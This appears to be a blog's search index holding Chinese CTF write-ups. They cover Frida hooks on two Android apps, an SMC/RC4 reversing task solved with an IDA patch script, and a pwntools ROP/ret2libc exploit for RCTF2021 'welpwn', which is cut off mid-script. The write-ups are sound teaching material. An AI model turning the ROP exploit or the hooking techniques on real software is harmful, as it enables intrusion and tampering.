<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>不知名的比赛题目</title>
      <link href="/2024/08/20/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/"/>
      <url>/2024/08/20/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="题目一：click-me-apk"><a href="#题目一：click-me-apk" class="headerlink" title="题目一：click_me.apk"></a>题目一：click_me.apk</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>拿到题目先去看看功能，同时反编译：<br>本次使用的是雷电模拟器9，安装后打开效果如下，这个效果很熟悉，连点嘛。</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820034920558.png" alt="image-20240820034920558"></p><p>jadx反编译看逻辑：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820035234644.png" alt="image-20240820035234644"></p><p>先看一下Main类：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820035911868.png" alt="image-20240820035911868"></p><p>这里就是主要的部分了，这里其实就是逻辑点：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> String <span class="title function_">getFlag</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>这里很明显，getFlag()在native层中，这里很明显可以想到，直接通过frida的脚本（js、python）直接进行截取就行，看看触发条件，这时其实已经猜的差不多了，应该时点击达到一定的数目，可以触发点击getflag按钮：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820040344148.png" alt="image-20240820040344148"></p><p>看看这里的两个方法，很搞笑，明显的对于CLICKS进行计数，可是还晃一下，文本框最多显示13371337下，实际需要达到99999999下，搞什么，当点击的数达到999999999下后，可以触发getFlag()函数。思路清晰，启动frida，显示在这个类中赋值给CLICKDS，然后点击按钮触发方法，截取flag：</p><p>脚本(这里就直接用js脚本，其实python脚本的格式要多多一点，但是操作简单)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.clickme.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">getFlagButtonClick</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">view</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;方法调用成功&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">CLICKS</span>.<span class="property">value</span> = <span class="number">99999999</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CLICKS value set to: &quot;</span> + <span class="variable language_">this</span>.<span class="property">CLICKS</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">getFlagButtonClick</span>(view);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//触发条件：点击按钮</span></span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">getFlag</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;方法调用成功&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getFlag</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getFlag() result: &#x27;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="利用过程-我这里写的略微详细一下，以防忘记操作"><a href="#利用过程-我这里写的略微详细一下，以防忘记操作" class="headerlink" title="利用过程(我这里写的略微详细一下，以防忘记操作)"></a>利用过程(我这里写的略微详细一下，以防忘记操作)</h2><ol><li>打开adb服务，然后进如模拟器，打开frida服务，这里是需要自己去上传对应的版本服务的：</li></ol><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820042204683.png" alt="image-20240820042204683"></p><p>到这里就说明已经开启了frida服务：</p><ol start="2"><li><p>下面就可以使用脚本了：</p><p>使用的命令：frida -U -f com.example.clickme -l xxxx.js(脚本名称)</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820043118483.png" alt="image-20240820043118483"></p></li></ol><p>这里就顺利的得到flag：flag{849d9e5421c59358ee4d568adebc5a70}</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820043319830.png" alt="image-20240820043319830"></p><p>这里就是那个表面搞笑的显示。</p><h1 id="题目二：Run"><a href="#题目二：Run" class="headerlink" title="题目二：Run"></a>题目二：Run</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>同样是先去看看关键词：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820044151951.png" alt="image-20240820044151951"></p><p>画风简洁，这就是啥，一个标题，一个按钮，一句欢迎您！！！</p><p>还是看看反编译的结果：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820044318208.png" alt="image-20240820044318208"></p><p>好家伙，这还加上混淆了，不过混淆的还凑合，能看的，不像之前的神秘符号(输入法都输不出来的)。开整：</p><p>这里不管它怎样命名，反正就一个按钮，这个按钮肯定是关键，直接跟：</p><p>来到了wjan6g1aXIJQJJbfuT这个类：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820044620388.png" alt="image-20240820044620388"></p><p>一眼没看见啥，就看见一个Running…，跑啥呢，我跟：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820044857745.png" alt="image-20240820044857745"></p><p>一跟不要紧，这是干嘛呀，直接看最后：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045108808.png" alt="image-20240820045108808"></p><p>哎呦一看这是有戏，其实没啥，就是一个文件读写的过程：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045230620.png" alt="image-20240820045230620"></p><p>本来想着走走捷径，创建文件了是不，直接找文件，我就直接运行，找找文件，</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045454470.png" alt="image-20240820045454470"></p><p>我这是直接一顿找，哥们，哥们，答案就在眼前：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045540203.png" alt="image-20240820045540203"></p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045609776.png" alt="image-20240820045609776"></p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045625992.png" alt="image-20240820045625992"></p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045712112.png" alt="image-20240820045712112"></p><p>这是个啥，发现这写入的内容与时间有关，之后回去，看看写入的方法：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820045922691.png" alt="image-20240820045922691"></p><p>随机点开一个这里有时间戳，还有写入的字符，这想要看完整的写入内容，就需要用frida将所有的写入的动作的字符存在一个变量中。说干就干，直接截取这个apk的写入内容就行。写了脚本，进行调试：这个脚本就是直接调用写的方法就行，主要是在写的过程中要注意，写入文件的格式。将每个字符变为字符串，然后发现，它没写入一个字符，就要换行，不利于我们缓存，想想，直接忽略换行符。（注意这里还有空格）</p><p>脚本：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RandomAccessFile</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.RandomAccessFile&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> readData = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> writeData = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 挂钩write()方法</span></span><br><span class="line">    <span class="title class_">RandomAccessFile</span>.<span class="property">write</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">buffer, off, len</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用原始write方法</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">write</span>(buffer, off, len);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印写入的内容</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = off; i &lt; off + len; i++) &#123;</span><br><span class="line">            data += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(buffer[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        data = data.<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&quot;&quot;</span>); <span class="comment">// 将换行符替换为空字符串</span></span><br><span class="line">        writeData += data;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Write data: &quot;</span> + data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重置计时器</span></span><br><span class="line">        <span class="keyword">if</span> (timer !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">        &#125;</span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Complete data: &quot;</span> + writeData);</span><br><span class="line">        &#125;, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最后不能让它运行不停，设个时钟，到点重传，不对，是到点，下班。脚本效果：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820051254577.png" alt="image-20240820051254577"></p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820052759299.png" alt="image-20240820052759299"></p><p>一长句话：Sdaj ukq snepa w lnkcnwi bkn Wjznkez, ukq qoa pda Knwyha Fwrw pkkho bkn aranupdejc, wjz wp pda ranu ajz, ukq lqod w xqppkj wjz owu, ‘Ykjranp pdeo pk Wjznkez bkniwp.’ BHWC{Yd4hh4jc3-5QyY33Z3z-y0jp1jQa!} Ajfku pda peju qjatlhwejwxha oaykjz. Ukq ywj hawnj sdwparan ukq swjp!</p><p>一看就是又进行了某种位移加密，直接怒嗦：</p><p><img src="/./../image/%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%9A%84%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/image-20240820053956285.png" alt="image-20240820053956285"></p><p>发现在凯撒的位移22下出现了flag：</p><p>mode1 #22: When you write a program for Android, you use the Oracle Java tools for everything, and at the very end, you push a button and say, ‘Convert this to Android format.’ FLAG{Ch4ll4ng3-5UcC33D3d-c0nt1nUe!} Enjoy the tiny unexplainable second. You can learn whatever you want!</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这两题都是相较基础的题目，主要看对于hook的初步使用，不用不知道到，用了才知道有多舒服，其实在这之前已经做过相关的题目了，所以在处理这两题来说才会想到直接用frida来搞。后来其实如果是脚本能力好的，可以根据时间戳和字符，直接获取，之后按照时间戳的大小来对字符进行排序，所以看到这个方法，感觉解题的方法还是很多的，主要看哪个操作自己更熟练一些了。但是无论哪种，还是要写脚本的。第二题，本来想着走捷径，结果上了一课。在frida等工具上还要加强使用，如果可以动手拆开apk文件，重新在打个标签，就好玩了，虽然之前游戏逆向，都会这么做一下，但是在android开发上还没有尝试，等有时间，一定要好好玩玩！！！</p><p>最后文末，欢迎大家来小站一起交流学习，多多评论。同同行对话其乐无穷，同大佬交流受益匪浅。虽然没人关注小站。但是橘子还是想去多多结识不同的人。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> android </tag>
            
            <tag> friada </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024磐石SMC</title>
      <link href="/2024/06/20/2024%E7%A3%90%E7%9F%B3SMC/"/>
      <url>/2024/06/20/2024%E7%A3%90%E7%9F%B3SMC/</url>
      
        <content type="html"><![CDATA[<p>“””这是关于上海的磐石行动的逆向题目：”””</p><h1 id="今天天气怎么样"><a href="#今天天气怎么样" class="headerlink" title="今天天气怎么样"></a>今天天气怎么样</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这题目中给出的是一个32bit的程序。：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820170811658.png" alt="image-20240820170811658"></p><p>看看这到题，前面式一个正常的判断的过程，首先是输入一个字符串str是一个30长度的。flag的长度就是30，对输入的长度进行了判断，之后是一个crazy()函数，可已跟进去：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820170841971.png" alt="image-20240820170841971"></p><p>这里就是在进行奇偶进行减法和异或的操作偶数减去索引，奇数异或索引。</p><p>下面还有一个ohh函数：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820170908559.png" alt="image-20240820170908559"></p><p>这里就进行的了最后的判断这里与unk_4040C0进行对比：</p><p>提取出unk_4040C0的数据：</p><pre><code>0x66, 0x6B, 0x63, 0x64, 0x7F, 0x63, 0x69, 0x70, 0x57, 0x60,0x79, 0x54, 0x78, 0x5B, 0x6B, 0x50, 0x67, 0x54, 0x73, 0x61,0x7C, 0x50, 0x64, 0x48, 0x6C, 0x56, 0x7E, 0x46, 0x65, 0x60</code></pre><p>下面就是写出脚本进行处理：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_crazy</span>(<span class="params">input_str</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(input_str[i]) ^ i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(input_str[i]) + i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># unk_4040C0的内容</span></span><br><span class="line">unk_4040C0 = [</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x70</span>, <span class="number">0x57</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x79</span>, <span class="number">0x54</span>, <span class="number">0x78</span>, <span class="number">0x5B</span>, <span class="number">0x6B</span>, <span class="number">0x50</span>, <span class="number">0x67</span>, <span class="number">0x54</span>, <span class="number">0x73</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x50</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0x65</span>, <span class="number">0x60</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将unk_4040C0的内容转换为字符串</span></span><br><span class="line">input_str = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> unk_4040C0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向crazy函数的变换操作</span></span><br><span class="line">flag = reverse_crazy(input_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="comment"># Flag: flag&#123;how_is_the_weather_today&#125;</span></span><br></pre></td></tr></table></figure><p>这是个错误的flag：</p><h2 id="SMC部分"><a href="#SMC部分" class="headerlink" title="SMC部分"></a>SMC部分</h2><p>其实下面才是真正的flag出现的地方</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171001804.png" alt="image-20240820171001804"></p><p>发现这里是smc操作其实就是代码加密混淆了：</p><p>这里就是将原有的函数进行了异或0x41的操作，要想得到my_function这个函数，就需要再次异或回去。本想着直接动调恢复到源码，结果发现，这里的调用函数的思路不同，上面的动调恢复到方法只适合在这里还是函数的时候，而这里是当作偏移量传递给了lpAddress这个。这样就直接静态调试好了，直接进行异或的操作：在IDA中运行脚本：</p><p>这里可以自己计算，也可以拿脚本计算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">star = 0x403000</span><br><span class="line">end = star+0x183</span><br><span class="line">for i in range(star,end+1):</span><br><span class="line">patch_byte(i,get_wide_byte(i)^0x41)</span><br><span class="line">print(&quot;解密完成&quot;)</span><br></pre></td></tr></table></figure><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171025548.png" alt="image-20240820171025548"></p><p>这是开始第地方，查看它的起始地址：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171038292.png" alt="image-20240820171038292"></p><p>上面是异或前的样子，下面是运行脚本后的样子：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171050907.png" alt="image-20240820171050907"></p><p>使其变成C语言：按c键</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171108082.png" alt="image-20240820171108082"></p><p>先是Force在是yes：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171125624.png" alt="image-20240820171125624"></p><p>之后是按下p键：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171135969.png" alt="image-20240820171135969"></p><p>这里就是异或后的函数，这时就可以F5了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __cdecl __noreturn my_function(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  char Str[50]; // [esp+16h] [ebp-2D2h] BYREF</span><br><span class="line">  int v3[30]; // [esp+48h] [ebp-2A0h] BYREF</span><br><span class="line">  unsigned __int8 v4[256]; // [esp+C0h] [ebp-228h] BYREF</span><br><span class="line">  char v5[256]; // [esp+1C0h] [ebp-128h] BYREF</span><br><span class="line">  unsigned int v6; // [esp+2C0h] [ebp-28h]</span><br><span class="line">  unsigned int j; // [esp+2C4h] [ebp-24h]</span><br><span class="line">  int v8; // [esp+2C8h] [ebp-20h]</span><br><span class="line">  int i; // [esp+2CCh] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  puts(&quot;please input your True flag:&quot;);</span><br><span class="line">  scanf(&quot;%40s&quot;, Str);</span><br><span class="line">  v6 = strlen(Str);</span><br><span class="line">  if ( v6 != 30 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(v3, &amp;unk_404040, sizeof(v3));</span><br><span class="line">  memset(v4, 0, sizeof(v4));</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  v1 = strlen(a1);</span><br><span class="line">  xxx_init(v4, (unsigned __int8 *)a1, v1);</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">    v5[i] = v4[i];</span><br><span class="line">  xxx_crypt(v4, (unsigned __int8 *)Str, v6);</span><br><span class="line">  v8 = 1;</span><br><span class="line">  for ( j = 0; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( j &gt;= v6 )</span><br><span class="line">      goto LABEL_11;</span><br><span class="line">    if ( (unsigned __int8)Str[j] != v3[j] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = 0;</span><br><span class="line">LABEL_11:</span><br><span class="line">  if ( v8 )</span><br><span class="line">    puts(&quot;Good! have a beautiful day for you!&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;May be try again?&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是完整的my_function(const char *a1)函数：</p><p>这里有一个参数：a1是上一次加密后的一个字符串：flag{how_is_the_weather_today}</p><p>在这个函数中可以看到：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171232354.png" alt="image-20240820171232354"></p><p>有两个函数，一个是初始化，一个是真正的加密（RC4），跟进去：</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171243656.png" alt="image-20240820171243656"></p><p>这里是想讲先是构造一个0，255的数组，后面就是进行值与值的交换。这里就是RC4的S盒。</p><p><img src="/./../image/2024%E7%A3%90%E7%9F%B3SMC/image-20240820171255284.png" alt="image-20240820171255284"></p><p>这里主要的就是进行了异或的操作，最终得脚本：(有的时候多去理解程序本身，比直接套用要好玩一些，如果是比赛就算了。那是“在规定时间内，拿最高分的策略”)</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v3 = [<span class="number">0x4D</span>, <span class="number">0xD8</span>, <span class="number">0x76</span>, <span class="number">0x2D</span>, <span class="number">0x0C</span>, <span class="number">0x26</span>, <span class="number">0x0C</span>, <span class="number">0x53</span>, <span class="number">0xDA</span>, <span class="number">0xC0</span>, </span><br><span class="line">      <span class="number">0x17</span>, <span class="number">0x37</span>, <span class="number">0x8C</span>, <span class="number">0xD7</span>, <span class="number">0xF3</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0x46</span>, <span class="number">0x2B</span>, <span class="number">0x15</span>,</span><br><span class="line">      <span class="number">0x98</span>, <span class="number">0x67</span>, <span class="number">0xF1</span>, <span class="number">0xAD</span>, <span class="number">0xA6</span>, <span class="number">0x0E</span>, <span class="number">0x7C</span>, <span class="number">0x66</span>, <span class="number">0x90</span>, <span class="number">0x7F</span></span><br><span class="line">    ]</span><br><span class="line">seed = <span class="string">&quot;flag&#123;how_is_the_weather_today&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxx_init</span>(<span class="params">seed</span>):</span><br><span class="line">    a1 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + a1[i] + <span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)])) % <span class="number">256</span></span><br><span class="line">        a1[i], a1[j] = a1[j], a1[i]</span><br><span class="line">    <span class="keyword">return</span> a1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxx_crypt</span>(<span class="params">a1, data</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + a1[i]) % <span class="number">256</span></span><br><span class="line">        a1[i], a1[j] = a1[j], a1[i]</span><br><span class="line">        out.append(c ^ a1[(a1[i] + a1[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line">a1 = xxx_init(seed)</span><br><span class="line"></span><br><span class="line">flag = xxx_crypt(a1, <span class="built_in">bytes</span>(v3))</span><br><span class="line"><span class="built_in">print</span>(flag.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># flag&#123;This_is_a_beautiful_day!&#125;</span></span><br></pre></td></tr></table></figure><p>这里得v3的值unk_404040：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v3 = [0x4D, 0xD8, 0x76, 0x2D, 0x0C, 0x26, 0x0C, 0x53, 0xDA, 0xC0, </span><br><span class="line">      0x17, 0x37, 0x8C, 0xD7, 0xF3, 0xD9, 0xD0, 0x46, 0x2B, 0x15,</span><br><span class="line">      0x98, 0x67, 0xF1, 0xAD, 0xA6, 0x0E, 0x7C, 0x66, 0x90, 0x7F</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SMC </tag>
            
            <tag> reverse </tag>
            
            <tag> 磐石行动初赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[RCTF2021]welpwn</title>
      <link href="/2023/08/21/RCTF2021-welpwn/"/>
      <url>/2023/08/21/RCTF2021-welpwn/</url>
      
        <content type="html"><![CDATA[<h1 id="RCTF2021-welpwn"><a href="#RCTF2021-welpwn" class="headerlink" title="[RCTF2021]welpwn"></a>[RCTF2021]welpwn</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/../image/RCTF2021-welpwn/image_Ys4tMjFYL-.png"></p><p>这一题拿来测试LibcSearcher的，没感情，直接上EXP：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">63406</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi = <span class="number">0x4008a1</span></span><br><span class="line">pop_4 = <span class="number">0x40089c</span></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">r.recvuntil(<span class="string">&quot;Welcome to RCTF\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_4) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">r.recv(<span class="number">3</span>)</span><br><span class="line">read_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span 